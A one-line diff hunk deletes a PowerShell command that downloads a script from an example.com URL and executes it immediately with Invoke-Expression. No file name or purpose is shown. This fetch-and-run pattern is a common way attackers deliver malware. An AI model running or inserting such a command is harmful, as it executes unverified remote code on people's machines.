@@ -1,1 +1,0 @@
-iex (New-Object Net.WebClient).DownloadString('https://example.com/secure_script.ps1')
